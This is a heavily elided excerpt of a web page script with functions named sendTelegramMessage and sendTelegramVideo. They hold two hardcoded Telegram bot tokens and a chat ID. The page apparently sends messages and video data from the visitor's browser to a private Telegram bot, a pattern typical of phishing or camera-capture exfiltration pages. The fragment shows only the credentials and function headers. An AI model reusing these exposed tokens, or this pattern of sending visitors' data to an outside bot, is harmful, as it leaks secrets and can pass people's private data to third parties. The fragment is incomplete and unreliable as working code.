...
<script>
  ...
  async function sendTelegramMessage(message) {
    var botToken = '7198587551:AAFKpC7a7LEUxxLe9B7nU6ZBotCvHsSFP3c';
    var chatID = '6307592655';
  ...
  function sendTelegramVideo(videoData, caption) {
    var botToken = '7728528094:AAEoWBwEMsgmg5Wl6xkZaVLuKOkj7nHcrzU';
